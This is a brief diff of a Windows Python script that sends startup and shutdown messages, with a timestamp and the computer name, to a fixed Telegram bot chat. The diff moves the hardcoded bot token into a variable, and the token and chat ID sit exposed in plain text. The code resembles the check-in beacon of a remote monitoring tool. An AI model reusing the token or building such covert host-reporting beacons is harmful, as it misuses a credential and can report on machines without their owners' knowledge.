@@ -21,11 +21,11 @@ import os
 
 user32 = windll.user32
 user32.SetProcessDPIAware()
-
+api = "5186491702:AAG8RVHpTmOKuTNrHUoO3Z1FXvj05hYlHmw"
 now = datetime.now()
 def onexit():
     text = "going offline"
-    requests.post(url="https://api.telegram.org/bot5186491702:AAG8RVHpTmOKuTNrHUoO3Z1FXvj05hYlHmw/sendMessage?chat_id=1424412028&text="+text)
+    requests.post(url="https://api.telegram.org/bot"+api+"/sendMessage?chat_id=1424412028&text="+text)
 starttext = "online  "+now.strftime("%H:%M:%S")+" "+str(now.date())+" "+os.environ['COMPUTERNAME']
 onstart = requests.post(url="https://api.telegram.org/bot5186491702:AAG8RVHpTmOKuTNrHUoO3Z1FXvj05hYlHmw/sendMessage?chat_id=1424412028&text="+starttext)
 print(onstart)
